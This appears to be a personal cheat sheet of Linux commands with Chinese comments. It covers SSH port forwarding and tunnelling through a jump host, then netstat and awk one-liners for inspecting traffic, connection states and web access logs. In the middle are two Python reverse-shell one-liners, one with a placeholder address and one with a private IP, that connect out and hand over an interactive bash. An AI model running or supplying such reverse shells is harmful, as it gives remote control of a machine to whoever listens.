ssh -L 7777:localhost:6666 root@192.168.123.162   #本地地址是相对于本机，目标地址是相对于提供ssh服务器的机器
本地端口转发命令： ssh -L 本地地址：本地端口：目的地址：目的端口 跳转机地址
ssh -L 0.0.0.0:7777:192.168.123.138:6666 root@192.168.123.162
ssh -R         7777:192.168.123.138:6666 192.168.123.125

ssh -L         7777:localhost:6666     root@192.168.1.242 #本地地址省略的情形
ssh -L 0.0.0.0:7777:192.168.1.236:6666 root@192.168.1.242
ssh -R         7777:192.168.1.253:6666 192.168.1.242   #跳转机 1.237 上执行远端转发命令

# 如果源不能 ssh 访问跳转机，但是跳转机能够 ssh 访问源主机，这个时候就可以使用远端转发，实现源转发到目的。
ssh -R          源端口：目的地址：目的端口 源地址（在跳转机上执行）。
ssh -R 0.0.0.0：源端口：目的地址：目的端口
-f 后台启用，可以在本机直接执行命令，无需另开新终端
-N 不打开远程shell，处于等待状态，不跳到远程主机，还在主机上，只是搭好了隧道，桥搭好，不ssh上去
-g 启用网关功能
ssh -D 0:44444 root@139.180.221.122

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.123.125',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);

查看各网卡的总流量 ip -s -h link
netstat -s ifconfig -s

nload eth0
dstat -tnf 1 10
sar -n TCP 1 10 可查看接下来10秒内的tcp数据
netstat -nt
iftop -nN -i eth0
nethogs -d 2 eth0 每2秒刷新流经eth0网卡的进程流量信息


	
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
netstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn  
netstat -n | awk '/^tcp/ {++S[$NF]};END {for(a in S) print a, S[a]}'  
netstat -n | awk '/^tcp/ {++state[$NF]}; END {for(key in state) print key,"\t",state[key]}'  
netstat -n | awk '/^tcp/ {++arr[$NF]};END {for(k in arr) print k,"\t",arr[k]}'  
netstat -n |awk '/^tcp/ {print $NF}'|sort|uniq -c|sort -rn  
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c

netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20

查找较多time_wait连接：
netstat -n|grep TIME_WAIT|awk '{print $5}'|sort|uniq -c|sort -rn|head -n20

	
netstat -an | grep SYN | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | more

查看当前并发访问数：	
netstat -an | grep ESTABLISHED | wc -l

查看访问记录，从1000行开始到3000：	
cat access.log |head -n 3000|tail -n 1000

Shell
cat access.log |tail -n +1000 |head -n 200

查看访问记录，从1000行开始，显示200行：
cat access.log |tail -n +1000 |head -n 200

查询访问最频繁的URL：	
awk '{print $7}' access.log|sort | uniq -c |sort -n -k 1 -r|more

查询访问最频繁的IP：
awk '{print $1}' access.log|sort | uniq -c |sort -n -k 1 -r|more

根据端口查找进程：	
netstat -ntlp | grep 80 | awk '{print $7}' | cut -d/ -f1

查看访问某一ip的所有外部连接IP(数量从多到少)：
netstat -nt | grep 139.180.221.122:443 | awk '{print $5}' | awk -F: '{print ($1>$4?$1:$4)}' | sort | uniq -c | sort -nr | head